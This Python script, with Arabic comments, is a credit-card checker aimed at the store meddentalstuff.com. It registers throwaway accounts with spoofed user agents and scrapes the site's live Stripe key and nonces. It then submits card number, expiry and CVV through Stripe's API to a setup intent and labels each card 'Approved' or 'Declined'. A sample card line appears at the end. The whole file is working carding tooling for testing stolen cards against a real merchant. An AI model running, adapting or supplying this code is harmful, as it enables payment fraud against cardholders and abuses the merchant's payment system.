import requests
from user_agent import generate_user_agent
import re
import random
import string
import uuid
import time

def Stripe5(ccx):
    """
    فحص بطاقة على meddentalstuff.com (Stripe - Auth)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        n = n.replace(" ", "")
        
        user = generate_user_agent()
        r = requests.Session()
        
        # ===== 1. فتح صفحة الحساب =====
        headers = {
            'authority': 'meddentalstuff.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get('https://meddentalstuff.com/my-account/', headers=headers)
        
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg:
            return "Declined"
        reg = reg.group(1)
        
        # ===== 2. تسجيل حساب جديد =====
        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
        
        headers = {
            'authority': 'meddentalstuff.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://meddentalstuff.com',
            'user-agent': user,
        }
        
        params = {'action': 'register'}
        
        data = {
            'email': email,
            'email_2': '',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        response = r.post('https://meddentalstuff.com/my-account/', params=params, data=data, headers=headers)
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        headers = {
            'authority': 'meddentalstuff.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get('https://meddentalstuff.com/my-account/add-payment-method/', headers=headers)
        
        # استخراج Stripe Key
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
        if not pk_live:
            return "Declined"
        pk_live = pk_live.group(1)
        
        # استخراج AJAX nonce
        nonces = re.findall(r'nonce[":=]+([a-zA-Z0-9]+)', response.text.lower())
        if not nonces:
            return "Declined"
        ajax_nonce = nonces[0]
        
        # ===== 4. جلب stripe identifiers =====
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'user-agent': user,
        }
        response = r.post('https://m.stripe.com/6', headers=headers, data='')
        try:
            detet = response.json()
            guid = detet.get('guid', str(uuid.uuid4()))
            muid = detet.get('muid', str(uuid.uuid4()))
            sid = detet.get('sid', str(uuid.uuid4()))
        except:
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
        
        # ===== 5. Consumer session lookup =====
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': user,
        }
        lookup_data = {
            'request_surface': 'web_elements_controller',
            'email_address': email,
            'email_source': 'default_value',
            'session_id': str(uuid.uuid4()),
            'key': pk_live,
            '_stripe_account': 'acct_1OybiACAY4rYVh06',
        }
        r.post('https://api.stripe.com/v1/consumers/sessions/lookup', data=lookup_data, headers=headers)
        
        # ===== 6. إرسال البطاقة إلى Stripe =====
        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        elements_session_id = f"elements_session_{uuid.uuid4().hex[:8]}"
        time_on_page = random.randint(10000, 99999)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': user,
        }
        
        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmeddentalstuff.com&time_on_page={time_on_page}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]={elements_session_id}&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_account=acct_1OybiACAY4rYVh06'
        
        response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers)
        
        try:
            resp_json = response.json()
            if 'id' not in resp_json:
                return "Declined"
            payment_id = resp_json['id']
        except:
            return "Declined"
        
        # ===== 7. تأكيد setup intent =====
        boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        multipart_data = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="action"\r\n\r\n'
            f'create_setup_intent\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="wcpay-payment-method"\r\n\r\n'
            f'{payment_id}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="_ajax_nonce"\r\n\r\n'
            f'{ajax_nonce}\r\n'
            f'--{boundary}--\r\n'
        )
        
        headers_ajax = {
            'authority': 'meddentalstuff.com',
            'accept': '*/*',
            'content-type': f'multipart/form-data; boundary={boundary}',
            'origin': 'https://meddentalstuff.com',
            'referer': 'https://meddentalstuff.com/my-account/add-payment-method/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        response_ajax = r.post('https://meddentalstuff.com/wp-admin/admin-ajax.php', data=multipart_data, headers=headers_ajax)
        text = response_ajax.text
        
        # ===== 8. تحليل النتيجة =====
        if '"success":true' in text or '"status":"succeeded"' in text:
            return '✅ Approved'
        else:
            return '❌ Declined'
        
    except Exception as e:
        return '❌ Declined'


if __name__ == '__main__':
    test_card = "5294158321468738|12|2026|904"
    result = Stripe5(test_card)
    print(f'Card: {test_card}')
    print(f'Result: {result}')